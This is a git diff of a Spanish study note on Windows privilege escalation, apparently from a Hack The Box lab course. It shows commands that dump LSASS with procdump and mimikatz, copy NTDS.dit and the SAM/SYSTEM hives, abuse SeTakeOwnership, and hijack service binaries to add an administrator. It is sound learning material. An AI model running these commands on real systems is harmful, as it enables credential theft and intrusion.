@@ -62,6 +62,7 @@ SQL (WINLPE-SRV01\sql_dev  dbo@master)>
 ```
 
 - Ahora en nuestra maquina atacante podemos escuchar en el puerto 8443.
+
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -lvnp 8443
@@ -75,14 +76,15 @@ whoami
 nt authority\system
 
 C:\Windows\system32>
-
 ``` 
 
 ## SeDebugPrivilege
+
 - Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeDebugPrivilege.
 - Podemos usar ProcDump de Sysinternals para conseguir un un dump de memoria LSASS.
 - `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
     - Ahora con esto podemos usar pypykatz en nuestra maquina atacante, o mimikatz en la maquina victima para obtener las credenciales de los servicios.
+
 ```
 mimikatz # log
 Using 'mimikatz.log' for logfile : OK
@@ -93,9 +95,11 @@ Switch to MINIDUMP : 'lsass.dmp'
 mimikatz # sekurlsa::logonpasswords
 Opening : 'lsass.dmp' file for minidump...
 ```
+
 - `pypykatz lsa minidump 'lsass (1).dmp'`
 - De todas formas siempre podemos dumpear a mano con el task manager.
 - ![](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)
+
 ### RCE con SeDebugPrivilege
 - Se pueden elevar los privilegios ejecutando un proceso hijo con privilegios eleveados heredando los privilegios de un proceso padre.
 - Podemos utilizar el [siguiente script](https://github.com/decoder-it/psgetsystem)
@@ -106,6 +110,7 @@ Opening : 'lsass.dmp' file for minidump...
     - NTFS, Registry, File, Process, Thread, Semaphore, Mutex, Desktop, Window Station, Message Queue, Job, and Section.
 - Este privilegio asigna permisos WRITE_OWNER para el objeto especificado.
 - Se puede intentar habilitar este privilegio usando [el siguieunte script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
+
 ```powershell
 PS C:\htb> Import-Module .\Enable-Privilege.ps1
 PS C:\htb> .\EnableAllTokenPrivs.ps1
@@ -119,6 +124,7 @@ SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
 ```
+
 - Después tenemos que elegir un archivo objetivo para la operación de tomar ownership.
     - Ejemplo: `cmd /c dir /q 'C:\Department Shares\Private\IT'`
         - Explicación del comando:
@@ -131,6 +137,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
     - `icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F`
     - Ahora con esto podemos tomar ownership de un archivo.
 ### En donde conviene usar esta técnica de tomar ownership
+
 ```
 c:\inetpub\wwwwroot\web.config
 %WINDIR%\repair\sam
@@ -153,12 +160,15 @@ PS C:\htb> Get-SeBackupPrivilege
 
 SeBackupPrivilege is enabled
 ```
+
 ### Copiar un archivo protegido
+
 - `PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`
 #### Atacando el DC, copiando NTDS.dit
 - Este grupo también nos permite hacer cosas interesantes como tomar el NTSD.dit del DC y copiarlo en una maquina que no tenga permisos de administrador..
     - Este archivo contiene hashes NTLM de todos los usuarios bajo el dominio.
     - Podemos utilizar diskshadow para copiar el disco C y exponerlo como disco E.
+
 ```powershell
 PS C:\htb> diskshadow.exe
 
@@ -179,9 +189,11 @@ DISKSHADOW> exit
 
 PS C:\htb> dir E:
 ```
+
 - `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
 #### Copiando los registros SAM y SYSTEM
 - Este privilegio también nos permite copiar los registros SAM y SYSTEM. Lo cual nos permite extraer credenciales de los usuarios mediante impacket-secretsdump.
+
 ```
 C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
 
@@ -205,10 +217,12 @@ The operation completed successfully.
 - Para enumearar podemos utilizar SharpUp.
 - `PS C:\htb> .\SharpUp.exe audit`
 ### Reemplazando el binario de un servicio
+
 ```
 C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
 C:\htb> sc start SecurityService
 ```
+
 ### Cambiando el path binario de un servicio
 - `C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"`
 - `sc stop WindscribeService`
